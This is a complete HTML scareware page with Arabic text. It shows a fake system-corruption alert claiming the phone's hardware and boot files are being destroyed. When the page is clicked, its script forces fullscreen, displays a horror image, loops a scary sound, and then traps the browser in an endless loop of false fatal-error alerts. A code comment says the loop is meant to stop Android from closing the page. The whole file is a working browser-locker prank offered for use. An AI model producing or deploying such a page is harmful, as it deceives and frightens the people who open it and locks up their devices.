<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SYSTEM_FAILURE_FOUKA</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: none; }
        #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; display: none; z-index: 9999; }
        
        /* تأثير اللاق والاهتزاز */
        .lag-effect { animation: shake 0.1s infinite; }
        @keyframes shake { 0% { transform: translate(1px, 1px); } 50% { transform: translate(-2px, -1px); } 100% { transform: translate(1px, 2px); } }

        #warningBox { 
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            color: #ff0000; border: 3px solid #ff0000; padding: 30px; font-family: 'Courier New', monospace;
            background: rgba(0,0,0,0.9); text-align: center; font-weight: bold; z-index: 100;
        }
    </style>
</head>
<body onclick="executeTotalVirus()">

    <div id="warningBox" class="lag-effect">
        ⚠️ ALERT: SYSTEM_CORRUPTION_DETECTED ⚠️<br><br>
        جاري تدمير ملفات الـ Hardware...<br>
        [إضغط هنا لإيقاف العملية]
    </div>
    
    <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
    
    <audio id="scaryVoice" src="https://www.myinstants.com/media/sounds/tfy-krk-79938.mp3" loop></audio>

    <script>
        function executeTotalVirus() {
            // 1. ملء الشاشة الفوري ومنع الخروج
            document.documentElement.requestFullscreen().catch(() => {});
            
            // 2. تفعيل الصورة والصوت الإجباري
            document.getElementById('warningBox').style.display = 'none';
            document.getElementById('horrorImg').style.display = 'block';
            document.getElementById('scaryVoice').play();

            // 3. توليد "لاق" وهمي وضغط على المعالج برسائل Alert متتالية
            setTimeout(() => {
                while(true) {
                    alert("⚠️ خطأ قاتل: تم حرق ملفات الـ Boot بنجاح.");
                    alert("FATAL_ERROR: YOUR_PHONE_IS_DYING...");
                    alert("لا تحاول الضغط على زر الرجوع، لقد فات الأوان.");
                    // تكرار الرسائل يمنع نظام الأندرويد من غلق الصفحة بسهولة
                }
            }, 300);
        }
    </script>
</body>
</html>
